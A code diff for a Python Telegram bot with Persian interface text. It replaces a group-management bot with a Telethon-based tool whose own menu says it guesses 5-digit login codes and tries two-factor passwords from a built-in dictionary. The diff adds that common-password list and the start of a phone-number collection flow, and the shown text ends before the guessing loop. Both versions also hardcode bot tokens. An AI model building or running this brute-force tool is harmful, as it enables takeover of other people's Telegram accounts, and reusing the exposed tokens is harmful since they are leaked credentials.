@@ -1,43 +1,18 @@
-import requests
-import time
 import logging
-import json
-import jdatetime
+import re
+import asyncio
 import os
-import platform
-import psutil
-import sys
-import threading
-from datetime import datetime, timedelta
-from threading import Timer
+import json
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
+import urllib.request
 
-# ==============================
-# 📌 تنظیمات مستقیم ربات
-# ==============================
-
-TOKEN = "8532288807:AAGJXJnmHJ68Cyh7eMK9muIcZydKAZLayVQ"
-OWNER_ID = 7803165903
-BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
-START_TIME = time.time()
-
-# ==============================
-# 📊 مدیریت وضعیت‌ها
-# ==============================
-
-service_lock_status = {}
-welcome_status = {}
-panel_users = {}
-panel_timers = {}
-
-STATS_FILE = "stats.json"
-
-# متغیرهای ارسال همگانی
-broadcast_data = {}
-broadcast_target = {}
-
-# ==============================
-# 📝 تنظیمات لاگینگ
-# ==============================
+# ============ تنظیمات ============
+TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -45,1105 +20,818 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ==============================
-# 💾 مدیریت فایل آمار
-# ==============================
+user_sessions = {}
+self_data = {}
 
-def load_stats():
-    if os.path.exists(STATS_FILE):
+DATA_FILE = "selfs.json"
+
+# ============ دیکشنری پسورد ============
+PASSWORD_DICT = [
+    "123456", "12345678", "123456789", "1234567890",
+    "password", "pass", "admin", "admin123",
+    "qwerty", "qwerty123", "abc123", "abcd1234",
+    "letmein", "welcome", "hello", "12345",
+    "111111", "222222", "333333", "444444",
+    "555555", "666666", "777777", "888888",
+    "999999", "000000", "123123", "321321",
+    "iloveyou", "monkey", "dragon", "master",
+    "sunshine", "princess", "shadow", "ninja",
+    "password1", "Password1", "Passw0rd",
+    "Admin123", "admin1234", "1234", "4321",
+    "0000", "1111", "2222", "3333", "4444",
+    "5555", "6666", "7777", "8888", "9999",
+    "00000000", "11111111", "22222222", "33333333",
+    "44444444", "55555555", "66666666", "77777777",
+    "88888888", "99999999", "0123456789",
+    "0987654321", "987654321", "1234567890",
+    "qwertyuiop", "asdfghjkl", "zxcvbnm",
+    "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
+    "q1w2e3r4", "a1b2c3d4", "z1x2c3v4",
+    "!@#$%^&*", "123qwe", "qwe123", "123abc",
+    "abc123!", "pass123", "123pass", "P@ssw0rd",
+    "P@ssword", "Pass@123", "Admin@123",
+    "admin@123", "root", "toor", "ubuntu",
+    "linux", "windows", "mac", "apple",
+    "google", "microsoft", "facebook", "twitter",
+    "instagram", "telegram", "whatsapp", "youtube",
+    "netflix", "spotify", "amazon", "github",
+    "stackoverflow", "reddit", "discord", "twitch",
+    "paypal", "coinbase", "binance", "crypto",
+    "bitcoin", "ethereum", "dogecoin", "solana",
+    "ripple", "cardano", "polkadot", "chainlink",
+    "1", "12", "123", "1234", "12345", "123456",
+    "1234567", "12345678", "123456789", "1234567890"
+]
+
+def load_data():
+    global self_data
+    try:
+        with open(DATA_FILE, 'r') as f:
+            self_data = json.load(f)
+    except:
+        self_data = {}
+
+def save_data():
+    try:
+        with open(DATA_FILE, 'w') as f:
+            json.dump(self_data, f)
+    except Exception as e:
+        logger.error(f"Error saving data: {e}")
+
+load_data()
+
+def delete_webhook():
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
+        with urllib.request.urlopen(url) as response:
+            return True
+    except:
+        return False
+
+def is_valid_phone(text):
+    phone = re.sub(r'[^0-9+]', '', text)
+    return len(phone) >= 10
+
+def is_valid_api_id(text):
+    return text.isdigit()
+
+def is_valid_api_hash(text):
+    return len(text) >= 30
+
+def mask_string(s, show=5):
+    if not s:
+        return "***"
+    if len(s) <= show:
+        return s
+    return s[:show] + "..." + s[-3:]
+
+async def clear_user_session(user_id):
+    if user_id in user_sessions:
         try:
-            with open(STATS_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
+            client = user_sessions[user_id].get('client')
+            if client:
+                await client.disconnect()
         except:
-            return {"users": [], "users_id": [], "groups": [], "groups_id": []}
-    return {"users": [], "users_id": [], "groups": [], "groups_id": []}
+            pass
+        del user_sessions[user_id]
 
-def save_stats(stats):
-    try:
-        with open(STATS_FILE, "w", encoding="utf-8") as f:
-            json.dump(stats, f, ensure_ascii=False, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"خطا در ذخیره آمار: {e}")
-        return False
-
-bot_stats = load_stats()
-
-# ==============================
-# 🕐 توابع کمکی زمان
-# ==============================
-
-def get_iran_time():
-    now = datetime.now()
-    jalali = jdatetime.datetime.fromgregorian(datetime=now)
-    weekdays = {6: 'شنبه', 0: 'یکشنبه', 1: 'دوشنبه', 2: 'سه‌شنبه', 
-                3: 'چهارشنبه', 4: 'پنج‌شنبه', 5: 'جمعه'}
-    weekday_name = weekdays.get(jalali.weekday(), '')
-    date_str = f"{weekday_name} {jalali.day} - {jalali.month} - {jalali.year}"
-    time_str = f"{jalali.hour:02d}:{jalali.minute:02d}:{jalali.second:02d}"
-    return date_str, time_str
-
-# ==============================
-# 📨 توابع ارتباط با API تلگرام
-# ==============================
-
-def send_message(chat_id, text, keyboard=None, reply_to_message_id=None):
-    if len(text) > 4096:
-        text = text[:4093] + "..."
+# ============ منوی اصلی ============
+async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
+    user = update.effective_user
+    name = user.first_name if user.first_name else "کاربر"
+    user_id = str(user.id)
     
-    url = f"{BASE_URL}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "disable_web_page_preview": True
-    }
-    if keyboard:
-        payload["reply_markup"] = keyboard
-    if reply_to_message_id:
-        payload["reply_to_message_id"] = reply_to_message_id
+    self_count = len(self_data.get(user_id, []))
     
-    try:
-        response = requests.post(url, json=payload, timeout=15)
-        if response.status_code == 200:
-            return response
-        elif response.status_code == 429:
-            retry_after = response.json().get("parameters", {}).get("retry_after", 5)
-            time.sleep(retry_after)
-            return send_message(chat_id, text, keyboard, reply_to_message_id)
-        else:
-            logger.error(f"خطا در ارسال: {response.text}")
-            return None
-    except Exception as e:
-        logger.error(f"خطا: {e}")
-        return None
+    text = f"""
+🤖 <b>ربات ساخت خودکار سلف</b>
 
-def delete_message(chat_id, message_id):
-    url = f"{BASE_URL}/deleteMessage"
-    payload = {"chat_id": chat_id, "message_id": message_id}
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            return True
-        elif response.status_code == 400:
-            return False
-        else:
-            logger.error(f"خطا در حذف: {response.text}")
-            return False
-    except Exception as e:
-        logger.error(f"خطا در حذف: {e}")
-        return False
+<b>سلام {name} گرامی</b>
 
-def edit_message(chat_id, message_id, text, keyboard=None):
-    if len(text) > 4096:
-        text = text[:4093] + "..."
-    
-    url = f"{BASE_URL}/editMessageText"
-    payload = {
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "disable_web_page_preview": True
-    }
-    if keyboard:
-        payload["reply_markup"] = keyboard
-    
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            return True
-        elif response.status_code == 400:
-            return False
-        else:
-            logger.error(f"خطا در ویرایش: {response.text}")
-            return False
-    except Exception as e:
-        logger.error(f"خطا: {e}")
-        return False
+این ربات به صورت خودکار:
+• کد تایید 5 رقمی را حدس می‌زند
+• پسورد 2FA را با دیکشنری امتحان می‌کند
 
-def answer_callback(callback_id, text=None, show_alert=False):
-    url = f"{BASE_URL}/answerCallbackQuery"
-    payload = {"callback_query_id": callback_id}
-    if text:
-        payload["text"] = text
-        payload["show_alert"] = show_alert
-    try:
-        requests.post(url, json=payload, timeout=10)
-    except Exception as e:
-        logger.error(f"خطا: {e}")
+<b>تعداد سلف‌های ثبت شده: {self_count}</b>
 
-def get_chat_member(chat_id, user_id):
-    url = f"{BASE_URL}/getChatMember"
-    payload = {"chat_id": chat_id, "user_id": user_id}
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            return response.json().get("result", {})
-        return {}
-    except Exception as e:
-        logger.error(f"خطا: {e}")
-        return {}
-
-def get_updates(offset=None):
-    url = f"{BASE_URL}/getUpdates"
-    params = {"timeout": 60, "offset": offset}
-    try:
-        response = requests.get(url, params=params, timeout=60)
-        if response.status_code == 200:
-            return response.json().get("result", [])
-        elif response.status_code == 429:
-            retry_after = response.json().get("parameters", {}).get("retry_after", 5)
-            time.sleep(retry_after)
-            return get_updates(offset)
-        return []
-    except Exception as e:
-        logger.error(f"خطا: {e}")
-        return []
-
-# ==============================
-# 🔧 توابع مدیریت گروه
-# ==============================
-
-def promote_owner(chat_id, user_id):
-    url = f"{BASE_URL}/promoteChatMember"
-    payload = {
-        "chat_id": chat_id,
-        "user_id": user_id,
-        "is_anonymous": False,
-        "can_change_info": True,
-        "can_post_messages": True,
-        "can_edit_messages": True,
-        "can_delete_messages": True,
-        "can_invite_users": True,
-        "can_restrict_members": True,
-        "can_pin_messages": True,
-        "can_promote_members": True,
-        "can_manage_chat": True,
-        "can_manage_voice_chats": True,
-        "can_manage_video_chats": True
-    }
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            logger.info(f"✅ کاربر {user_id} ادمین شد")
-            return True
-        else:
-            logger.error(f"❌ خطا در ادمین کردن: {response.text}")
-            return False
-    except Exception as e:
-        logger.error(f"❌ خطا: {e}")
-        return False
-
-def set_owner_title(chat_id, user_id):
-    url = f"{BASE_URL}/setChatAdministratorCustomTitle"
-    payload = {
-        "chat_id": chat_id,
-        "user_id": user_id,
-        "custom_title": "⋆ سازنده ربات ⋆"
-    }
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        return response.status_code == 200
-    except Exception as e:
-        logger.error(f"خطا در تنظیم لقب: {e}")
-        return False
-
-def is_admin(chat_id, user_id):
-    try:
-        member = get_chat_member(chat_id, user_id)
-        status = member.get("status", "")
-        return status in ["creator", "administrator"]
-    except:
-        return False
-
-def get_group_info(chat_id):
-    url = f"{BASE_URL}/getChat"
-    try:
-        response = requests.get(url, json={"chat_id": chat_id}, timeout=10)
-        if response.status_code == 200:
-            return response.json().get("result", {})
-        return {}
-    except Exception as e:
-        logger.error(f"خطا در دریافت اطلاعات گروه: {e}")
-        return {}
-
-def get_group_members_count(chat_id):
-    try:
-        url = f"{BASE_URL}/getChatMembersCount"
-        response = requests.get(url, json={"chat_id": chat_id}, timeout=10)
-        if response.status_code == 200:
-            return response.json().get("result", 0)
-        return 0
-    except:
-        return 0
-
-def get_group_owner(chat_id):
-    try:
-        url = f"{BASE_URL}/getChatMember"
-        payload = {"chat_id": chat_id, "user_id": OWNER_ID}
-        response = requests.get(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            result = response.json().get("result", {})
-            if result.get("status") == "creator":
-                user = result.get("user", {})
-                return f"{user.get('first_name', '')} {user.get('last_name', '')}".strip()
-        return "نامشخص"
-    except:
-        return "نامشخص"
-
-def delete_message_after_delay(chat_id, message_id, delay=10):
-    def delete_later():
-        time.sleep(delay)
-        delete_message(chat_id, message_id)
-    threading.Thread(target=delete_later, daemon=True).start()
-
-def send_report_to_owner(chat_id, user_id, user_name):
-    group_info = get_group_info(chat_id)
-    group_name = group_info.get("title", "بدون نام")
-    group_username = group_info.get("username", "")
-    group_link = f"https://t.me/{group_username}" if group_username else "گروه خصوصی"
-    member_count = get_group_members_count(chat_id)
-    owner = get_group_owner(chat_id)
-    
-    report_text = f"""
-📊 گزارش اضافه شدن ربات به گروه
-
-👤 کاربر اضافه‌کننده : <a href='tg://user?id={user_id}'>{user_name}</a>
-📛 نام گروه : {group_name}
-🔗 لینک گروه : {group_link}
-👥 تعداد اعضا : {member_count}
-👑 مالک گروه : {owner}
+برای شروع روی دکمه زیر کلیک کنید:
 """
-    send_message(OWNER_ID, report_text)
-
-# ==============================
-# 📊 توابع آمار و گزارش
-# ==============================
-
-def get_all_users_text(page=1):
-    users_per_page = 10
-    total_users = len(bot_stats["users"])
-    total_pages = max(1, (total_users + users_per_page - 1) // users_per_page)
     
-    if page > total_pages:
-        page = total_pages
+    keyboard = [
+        [InlineKeyboardButton("🔑 ورود و ساخت سلف", callback_data="new_session")]
+    ]
     
-    start_idx = (page - 1) * users_per_page
-    end_idx = start_idx + users_per_page
-    users_slice = list(zip(bot_stats["users"], bot_stats["users_id"]))[start_idx:end_idx]
-    
-    text = f"👤 <b>لیست کاربران ربات</b>\n\n"
-    if users_slice:
-        text += f"📊 صفحه {page}/{total_pages} | تعداد کل: {total_users}\n\n"
-        for i, (name, uid) in enumerate(users_slice, start=start_idx + 1):
-            text += f"{i}. <a href='tg://user?id={uid}'>{name}</a>\n"
+    if edit and update.callback_query:
+        try:
+            await update.callback_query.edit_message_text(
+                text,
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode='HTML'
+            )
+            await update.callback_query.answer()
+        except:
+            pass
     else:
-        text += "📭 هنوز کاربری ثبت نشده"
-    
-    return text, page, total_pages
+        await update.message.reply_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='HTML'
+        )
 
-def get_all_groups_text(page=1):
-    groups_per_page = 10
-    total_groups = len(bot_stats["groups"])
-    total_pages = max(1, (total_groups + groups_per_page - 1) // groups_per_page)
-    
-    if page > total_pages:
-        page = total_pages
-    
-    start_idx = (page - 1) * groups_per_page
-    end_idx = start_idx + groups_per_page
-    groups_slice = list(zip(bot_stats["groups"], bot_stats["groups_id"]))[start_idx:end_idx]
-    
-    text = f"📁 <b>لیست گروه‌های ربات</b>\n\n"
-    if groups_slice:
-        text += f"📊 صفحه {page}/{total_pages} | تعداد کل: {total_groups}\n\n"
-        for i, (name, gid) in enumerate(groups_slice, start=start_idx + 1):
-            group_info = get_group_info(gid)
-            group_username = group_info.get("username", "")
-            member_count = get_group_members_count(gid)
-            owner = get_group_owner(gid)
-            if group_username:
-                link = f"https://t.me/{group_username}"
-                text += f"{i}. <a href='{link}'>{name}</a> (👥 {member_count} - 👑 {owner})\n"
-            else:
-                text += f"{i}. {name} (🔒 خصوصی - 👥 {member_count} - 👑 {owner})\n"
-    else:
-        text += "📭 هنوز گروهی ثبت نشده"
-    
-    return text, page, total_pages
-
-def get_stats_text():
-    total_users = len(bot_stats["users"])
-    total_groups = len(bot_stats["groups"])
-    
-    return f"""
-📊 <b>آمار کامل ربات ReaperVoid</b>
-
-📈 <b>آمار کلی :</b>
-
-👤 تعداد کل کاربران : <b>{total_users}</b>
-📁 تعداد کل گروه‌ها : <b>{total_groups}</b>
-"""
-
-def get_ping_text():
+# ============ دکمه ساخت سلف ============
+async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
     try:
-        start = time.time()
-        response = requests.get(f"{BASE_URL}/getMe", timeout=10)
-        ping = round((time.time() - start) * 1000, 2)
-        
-        cpu_percent = psutil.cpu_percent(interval=0.3)
-        memory = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
-        
-        if ping < 100:
-            status = "🟢 عالی"
-        elif ping < 300:
-            status = "🟡 قابل قبول"
-        else:
-            status = "🔴 ضعیف"
-        
-        return f"""
-📡 <b>بررسی پینگ و وضعیت سرور</b>
-
-⏱ زمان پاسخگویی : <b>{ping} ms</b>
-📊 وضعیت : <b>{status}</b>
-
-🖥 <b>اطلاعات سرور :</b>
-💻 سیستم‌عامل : {platform.system()} {platform.release()}
-🐍 نسخه پایتون : {platform.python_version()}
-🔥 پردازنده : {cpu_percent}% استفاده
-💾 رم : {memory.used // (1024**3)}/{memory.total // (1024**3)} GB ({memory.percent}%)
-💿 هارد : {disk.used // (1024**3)}/{disk.total // (1024**3)} GB ({disk.percent}%)
-"""
-    except Exception as e:
-        return f"❌ خطا در دریافت اطلاعات: {e}"
-
-def get_credit_text():
-    try:
-        uptime_seconds = psutil.boot_time()
-        boot_time = datetime.fromtimestamp(uptime_seconds)
-        now = datetime.now()
-        days_running = (now - boot_time).days
-        
-        total_days = 30
-        days_left = total_days - days_running
-        if days_left < 0:
-            days_left = 0
-            status = "🔴 منقضی شده"
-        elif days_left < 7:
-            status = "🟡 رو به اتمام"
-        else:
-            status = "🟢 فعال"
-        
-        return f"""
-⏳ <b>اعتبار هاست</b>
-
-📅 زمان راه‌اندازی : {boot_time.strftime('%Y/%m/%d %H:%M')}
-📆 روزهای فعالیت : {days_running} روز
-⏳ روزهای باقی‌مانده : {days_left} روز
-📊 وضعیت : <b>{status}</b>
-
-⚠️ توجه : پس از اتمام اعتبار، ربات غیرفعال خواهد شد.
-"""
+        await query.answer()
     except:
-        return """
-⏳ <b>اعتبار هاست</b>
-
-📊 وضعیت : 🟢 فعال
-📅 اعتبار : نامحدود (سرور اختصاصی)
-
-⚠️ در صورت نیاز به اطلاعات دقیق‌تر، با پشتیبانی تماس بگیرید.
-"""
-
-# ==============================
-# 🔐 مدیریت پنل
-# ==============================
-
-def close_panel(chat_id, message_id):
-    if chat_id in panel_users:
-        del panel_users[chat_id]
-    if chat_id in panel_timers:
-        del panel_timers[chat_id]
-    edit_message(chat_id, message_id, "◂ بدلیل عدم فعالیت پنل بسته شد !", None)
-    logger.info(f"پنل گروه {chat_id} بسته شد")
-
-def reset_panel_timer(chat_id, message_id):
-    if chat_id in panel_timers:
-        panel_timers[chat_id].cancel()
-    panel_timers[chat_id] = Timer(60.0, close_panel, args=[chat_id, message_id])
-    panel_timers[chat_id].start()
-
-# ==============================
-# ⌨️ کیبوردها و متن‌ها
-# ==============================
-
-def get_owner_start_text():
-    return """
-╮━━━〔 پنل مدیریت ربات 〕━━━╭
-│
-│ ◄ خوش آمدید، <a href="tg://user?id=7803165903">برنامه‌نویس گرامی</a>.
-│
-│ ⫸ مدیریت کامل ربات از این بخش امکان‌پذیر است.
-│ ⫸ تنظیمات، آمار و وضعیت عملکرد ربات
-│    در دسترس شما قرار دارد.
-│
-│ ◂ لطفاً بخش موردنظر خود را انتخاب نمایید.
-│
-╰━━━━━━━━━━━━━━━━━━━━━━╯
-"""
-
-def get_owner_keyboard():
-    keyboard = [
-        [{"text": "📊 آمار کامل", "callback_data": "stats"}],
-        [{"text": "📡 بررسی پینگ", "callback_data": "ping"}, {"text": "⏳ اعتبار هاست", "callback_data": "credit"}],
-        [{"text": "📨 ارسال پیام همگانی", "callback_data": "broadcast"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_stats_keyboard():
-    keyboard = [
-        [{"text": "👤 کاربران ربات", "callback_data": "all_users"}],
-        [{"text": "📁 گروه‌های ربات", "callback_data": "all_groups"}],
-        [{"text": "🔙 بازگشت", "callback_data": "back_owner"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_users_keyboard(page, total_pages):
-    keyboard = []
-    nav_buttons = []
-    if page > 1:
-        nav_buttons.append({"text": "◀️ قبلی", "callback_data": f"users_page_{page-1}"})
-    if page < total_pages:
-        nav_buttons.append({"text": "▶️ بعدی", "callback_data": f"users_page_{page+1}"})
-    if nav_buttons:
-        keyboard.append(nav_buttons)
-    keyboard.append([{"text": "🔙 بازگشت", "callback_data": "back_stats"}])
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_groups_keyboard(page, total_pages):
-    keyboard = []
-    nav_buttons = []
-    if page > 1:
-        nav_buttons.append({"text": "◀️ قبلی", "callback_data": f"groups_page_{page-1}"})
-    if page < total_pages:
-        nav_buttons.append({"text": "▶️ بعدی", "callback_data": f"groups_page_{page+1}"})
-    if nav_buttons:
-        keyboard.append(nav_buttons)
-    keyboard.append([{"text": "🔙 بازگشت", "callback_data": "back_stats"}])
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_broadcast_keyboard():
-    keyboard = [
-        [{"text": "👤 به کاربران", "callback_data": "broadcast_users"}],
-        [{"text": "📁 به گروه‌ها", "callback_data": "broadcast_groups"}, {"text": "📨 به همه", "callback_data": "broadcast_all"}],
-        [{"text": "🔙 بازگشت", "callback_data": "back_owner"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_broadcast_back_keyboard():
-    keyboard = [[{"text": "🔙 بازگشت", "callback_data": "back_broadcast"}]]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_start_text(user_id, first_name):
-    return f"""
-🌟 <b>سلام بر تو <a href="tg://user?id={user_id}">{first_name}</a> عزیز</b> 🌹
-
-💬 من رباتی هوشمند و قدرتمند برای مدیریت حرفه‌ای گروه‌های تلگرامی هستم!
-
-🔥 <b>برتری‌های انحصاری من :</b>
-
-⚡ پاکسازی گروه در کسری از ثانیه
-🛡 سیستم ضدترک گروه
-🔒 قفل‌های متنوع و حرفه‌ای
-👋 خوش‌آمدگویی هوشمند
-📊 گزارش‌گیری دقیق و روزانه
-🚫 بدون تبلیغات مزاحم
-
-✨ <b>ویژگی‌های منحصربفرد :</b>
-
-⏫ ۹۹.۹٪ آپتایم
-🖥 هاست قدرتمند و اختصاصی
-🚀 سرعت بی‌نظیر در گروه‌های سنگین
-🛡 پایداری در برابر حملات
-🔐 قفل‌های متنوع و حرفه‌ای
-🤖 احوالپرسی اتوماتیک و هوشمند
-➕ قابلیت اضافه کردن اجباری
-📋 گزارش‌گیری دقیق و روزانه
-⏳ دوره تست برای اطمینان
-🚫 کاملاً بدون تبلیغات مزاحم
-
-⚡ <b>ما شبیه هیچکس نیستیم!</b>
-
-🛡 امنیت گروه، اولویت اول ماست
-💎 کیفیت، حرف اول را می‌زند
-⚡ سرعت، مزیت رقابتی ماست
-
-❓ <b>چرا به ما اعتماد کنیم؟</b>
-
-⚡ پردازش فوق‌سریع
-📞 پاسخگویی آنی
-🔄 آپدیت‌های مستمر
-👨‍💻 پشتیبانی حرفه‌ای
-
-💻 <b>ساخته شده توسط تیم ZX</b>
-
-⚠️ <b>تذکر حقوقی :</b>
-
-❗ تمامی ایده‌ها و کدهای این ربات متعلق به تیم ZX بوده و هر گونه کپی‌برداری یا تقلید، پیگرد قانونی دارد. حقوق مادی و معنوی محفوظ است.
-
-【 <b>Licenced By 🆉︎🆇︎</b> 】
-"""
-
-def get_welcome_text(first_name, group_name, user_id):
-    date_str, time_str = get_iran_time()
-    return f"""
-👋 سلام <a href="tg://user?id={user_id}">{first_name}</a> عزیز 🌹
-🎉 به گروه {group_name} خوش اومدی 💐
-📆 تاریخ : {date_str} 
-⏰ ساعت : {time_str}
-"""
-
-def get_unknown_text():
-    return """
-❌ <b>متاسفانه منظور شما رو نفهمیدم!</b>
-🔰 برای مشاهده منوی اصلی، دستور <b>/start</b> را ارسال کنید.
-📌 ما همیشه در کنار شما هستیم!
-"""
-
-def get_info_text():
-    return """
-📓 <b>اطلاعات بیشتر درباره ربات ReaperVoid :</b>
-
-✅ این ربات بر روی <b>سرورهای اختصاصی و باکیفیت آمستردام هلند</b> مستقر شده است.
-✅ هدف اصلی ما، <b>حفاظت کامل از گروه شما</b> در تمامی ابعاد است.
-✅ هیچگونه دسترسی یا سوءاستفاده‌ای از گروه شما انجام نخواهد شد.
-✅ ربات ReaperVoid همواره در حال <b>به‌روزرسانی و توسعه</b> است.
-✅ این ربات توسط <b>تیم حرفه‌ای ZX</b> توسعه یافته است.
-"""
-
-def get_compare_text():
-    return """
-🦾 <b>درباره ربات ReaperVoid</b>
-
-💎 این ربات کاملاً <b>رایگان</b> است!
-💰 بدون هیچگونه هزینه
-🚀 سرعت فوق‌العاده
-⚙️ قابلیت‌های پیشرفته
-🛡 پشتیبانی کامل
-🔄 آپدیت مادام‌العمر
-🔒 امنیت کامل
-🔰 <b>با ReaperVoid ، گروه خود را به سطح بعدی ببرید!</b>
-"""
-
-def get_main_keyboard():
-    keyboard = [
-        [{"text": "➕ اضافه کردن ربات به گروه", "url": "https://t.me/ReaperVoidbot?startgroup=new"}],
-        [{"text": "📓 اطلاعات بیشتر", "callback_data": "info"}, {"text": "🦾 درباره ربات", "callback_data": "compare"}],
-        [{"text": "👨‍💻 پشتیبانی", "url": "https://t.me/XMrAmer"}, {"text": "💬 گروه پشتیبانی", "url": "https://t.me/ReaperVoidGP"}],
-        [{"text": "📢 کانال ربات", "url": "https://t.me/ReaperVoidTM"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_back_keyboard():
-    keyboard = [[{"text": "🔙 بازگشت به منوی اصلی", "callback_data": "back"}]]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_panel_keyboard():
-    keyboard = [
-        [{"text": "🔒 قفل‌ها", "callback_data": "locks"}],
-        [{"text": "⚙️ تنظیمات پیشرفته", "callback_data": "advanced"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
-
-def get_panel_text():
-    return """
-◂ <b>لطفا بخش مورد نظر خود را انتخاب کنید :</b>
-"""
-
-def get_locks_text():
-    return """
-🔒 <b>پنل تنظیمات گروه :</b>
-پنل اصلی 🔹 قفلها 🔹 بخش اول
-"""
-
-def get_locks_keyboard(chat_id):
-    service_status = service_lock_status.get(chat_id, False)
+        pass
     
-    if service_status:
-        service_text = "🔓 باز کردن خدمات تلگرام"
-        service_data = "unlock_service"
-    else:
-        service_text = "🔒 قفل خدمات تلگرام"
-        service_data = "lock_service"
+    user_id = query.from_user.id
+    await clear_user_session(user_id)
+    user_sessions[user_id] = {"step": "phone"}
     
-    keyboard = [
-        [{"text": service_text, "callback_data": service_data}],
-        [{"text": "🔙 بازگشت", "callback_data": "panel_back"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
+    text = """
+📱 <b>مرحله اول: وارد کردن شماره تلفن</b>
 
-def get_advanced_text(chat_id):
-    welcome_status_text = "فعال" if welcome_status.get(chat_id, True) else "غیرفعال"
-    
-    return f"""
-〽️ <b>تنظیمات پیشرفته :</b>
+لطفاً شماره تلفن مورد نظر را به همراه کد کشور وارد کنید.
 
-  ▐ خوش‌ آمدگویی : {welcome_status_text}
-  ▐ ضد تبچی : غیرفعال
+<b>مثال:</b> <code>989123456789</code>
 
-─┅━━━━✦━━━━┅─
+⚠️ شماره را بدون علامت (+) وارد کنید.
 """
-
-def get_advanced_keyboard(chat_id):
-    welcome_status_text = welcome_status.get(chat_id, True)
     
-    if welcome_status_text:
-        welcome_text = "🚫 غیرفعال کردن خوش آمدگویی"
-        welcome_data = "disable_welcome"
-    else:
-        welcome_text = "✅ فعال کردن خوش آمدگویی"
-        welcome_data = "enable_welcome"
+    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
     
-    keyboard = [
-        [{"text": welcome_text, "callback_data": welcome_data}],
-        [{"text": "🔙 بازگشت", "callback_data": "panel_back"}]
-    ]
-    return json.dumps({"inline_keyboard": keyboard})
+    try:
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+    except:
+        pass
 
-# ==============================
-# 🎯 پردازش پیام‌ها
-# ==============================
-
-def clean_group(chat_id, message_id):
-    msg = send_message(chat_id, "🧹 پاکسازی گروه شروع شد لطفا صبر نمایید !", 
-                       reply_to_message_id=message_id)
-    if not msg:
+# ============ دریافت شماره ============
+async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
+        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
         return
     
-    msg_id = msg.json().get("result", {}).get("message_id")
-    deleted_count = 0
+    phone = re.sub(r'[^0-9+]', '', text)
     
-    try:
-        offset = None
-        for _ in range(50):
-            url = f"{BASE_URL}/getUpdates"
-            params = {"chat_id": chat_id, "limit": 100}
-            if offset:
-                params["offset"] = offset
-            
-            response = requests.get(url, params=params, timeout=10)
-            if response.status_code != 200:
-                break
-            
-            updates = response.json().get("result", [])
-            if not updates:
-                break
-            
-            for update in updates:
-                if "message" in update:
-                    mid = update["message"]["message_id"]
-                    if delete_message(chat_id, mid):
-                        deleted_count += 1
-                    time.sleep(0.05)
-            
-            if updates:
-                offset = updates[-1]["update_id"] + 1
-            else:
-                break
-        
-        if deleted_count > 0:
-            edit_message(chat_id, msg_id, 
-                        f"✅ پاکسازی گروه با موفقیت انجام شد !\n🗑 تعداد پیام‌های حذف شده: {deleted_count}")
-        else:
-            edit_message(chat_id, msg_id, "📭 هیچ پیامی برای پاکسازی وجود نداشت !")
-            
-    except Exception as e:
-        edit_message(chat_id, msg_id, f"❌ خطا در پاکسازی: {str(e)}")
-
-def handle_message(update):
-    global broadcast_target, broadcast_data
-    
-    message = update.get("message", {})
-    chat_id = message.get("chat", {}).get("id")
-    message_id = message.get("message_id")
-    chat_type = message.get("chat", {}).get("type")
-    user = message.get("from", {})
-    user_id = user.get("id", 0)
-    first_name = user.get("first_name", "کاربر")
-    text = message.get("text", "").strip()
-    
-    if not chat_id:
+    if not is_valid_phone(phone):
+        await update.message.reply_text(
+            "❌ شماره تلفن نامعتبر است!\n\nمثال: <code>989123456789</code>",
+            parse_mode='HTML'
+        )
         return
     
-    # ===== پردازش ارسال همگانی =====
-    if chat_type == "private" and user_id == OWNER_ID:
-        if chat_id in broadcast_data and broadcast_data[chat_id]:
-            target = broadcast_target.get(chat_id, "all")
-            msg_text = broadcast_data[chat_id]
-            success_count = 0
+    user_sessions[user_id]['phone'] = phone
